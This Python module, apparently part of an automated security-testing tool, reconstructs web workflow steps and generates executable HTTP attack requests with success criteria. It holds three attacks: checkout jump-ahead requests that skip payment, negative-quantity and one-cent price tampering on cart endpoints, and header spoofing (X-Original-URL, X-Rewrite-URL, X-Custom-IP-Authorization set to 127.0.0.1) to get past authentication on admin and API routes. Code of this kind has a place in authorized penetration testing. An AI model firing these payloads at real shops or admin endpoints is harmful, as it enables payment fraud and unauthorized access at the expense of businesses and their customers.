"""
Logical Business State Machine Engine
Tracks sequential workflow transitions, detects state invariants, and generates concrete bypass payloads.
"""

import json
from typing import Any, Dict, List, Optional
from ai_osop.core.models import BusinessInvariant


class LogicalBusinessStateMachine:
    """Models multi-step business process transitions and compiles executable bypass payloads."""

    def __init__(self, steps: List[Dict[str, Any]]):
        self.steps = sorted(steps, key=lambda s: s.get("order", 0))

    def reconstruct_transitions(self) -> List[Dict[str, Any]]:
        """Map the sequential dependencies (Step A -> Step B) from workflow steps."""
        transitions = []
        for i in range(len(self.steps) - 1):
            from_step = self.steps[i]
            to_step = self.steps[i + 1]
            if from_step.get("url") and to_step.get("url"):
                transitions.append(
                    {
                        "from_url": from_step["url"],
                        "from_method": from_step.get("method", "GET"),
                        "to_url": to_step["url"],
                        "to_method": to_step.get("method", "GET"),
                        "order": i,
                    }
                )
        return transitions

    def generate_bypass_payloads(self) -> List[Dict[str, Any]]:
        """Analyze transitions and compile concrete, executable HTTP bypass requests."""
        payloads = []
        transitions = self.reconstruct_transitions()

        for trans in transitions:
            to_url = trans["to_url"]
            to_method = trans["to_method"]

            # Heuristic 1: E-commerce checkout jump-ahead bypass (Cart -> Ship without Pay)
            if "cart" in trans["from_url"].lower() and (
                "checkout" in to_url.lower() or "pay" in to_url.lower()
            ):
                payloads.append(
                    {
                        "strategy": "jump_ahead_bypass",
                        "invariant_id": f"inv-seq-{trans['order']}",
                        "impact": "High (unauthorized state transition bypass)",
                        "request": {
                            "method": to_method,
                            "url": to_url,
                            "headers": {
                                "Content-Type": "application/json",
                                "X-Bypass-Test": "stateful-logic-agent",
                            },
                            "json": {"bypass_state": "true", "step_override": "payment"},
                        },
                        "success_criteria": {
                            "status_in": [200, 201, 302],
                            "body_not_contains": "unauthorized",
                        },
                    }
                )

            # Heuristic 2: Parameter Tampering / Quantity Injection
            if "checkout" in to_url.lower() or "cart" in to_url.lower():
                payloads.append(
                    {
                        "strategy": "negative_parameter_injection",
                        "invariant_id": f"inv-param-{trans['order']}",
                        "impact": "High (business-logic parameter injection)",
                        "request": {
                            "method": "POST" if to_method == "GET" else to_method,
                            "url": to_url,
                            "headers": {"Content-Type": "application/json"},
                            "json": {
                                "quantity": -1,
                                "price": 0.01,
                                "items": [{"id": "1", "quantity": -5}],
                            },
                        },
                        "success_criteria": {
                            "status_in": [200, 201],
                            "body_contains": "success",
                        },
                    }
                )

            # Heuristic 3: Gateway / Header Bypass
            if "admin" in to_url.lower() or "api/v1" in to_url.lower():
                payloads.append(
                    {
                        "strategy": "header_override_bypass",
                        "invariant_id": f"inv-header-{trans['order']}",
                        "impact": "High (gateway authentication bypass)",
                        "request": {
                            "method": to_method,
                            "url": to_url,
                            "headers": {
                                "X-Original-URL": to_url,
                                "X-Rewrite-URL": to_url,
                                "X-Custom-IP-Authorization": "127.0.0.1",
                            },
                        },
                        "success_criteria": {
                            "status_in": [200, 201],
                            "status_not_in": [401, 403],
                        },
                    }
                )

        return payloads
